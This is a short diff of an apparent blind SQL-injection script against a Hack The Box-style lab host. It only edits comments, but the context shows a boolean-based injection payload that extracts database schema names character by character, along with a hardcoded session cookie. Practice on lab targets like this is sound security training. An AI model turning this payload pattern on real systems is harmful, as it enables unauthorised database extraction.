@@ -11,7 +11,8 @@ from math import floor
 
 #Injection paramater is denoted as {} in URL
 URL = "http://logger.htb/room.php?cod={}"
-#THis should be the full injection including quotes and comments as needed
+#This should be the full injection including quotes and comments as needed
+#String formatters are which query result to return, and the current chracter of that result
 QUERY = "2 AND ascii(substring((SELECT schema_name FROM INFORMATION_SCHEMA.schemata limit {},1),{},1))=CHAR"
 TRUE_RESPONSE = "Suite room is perfect"
 COOKIES = {"PHPSESSID":"34f8hdthk6clvjqskta054ob53"}
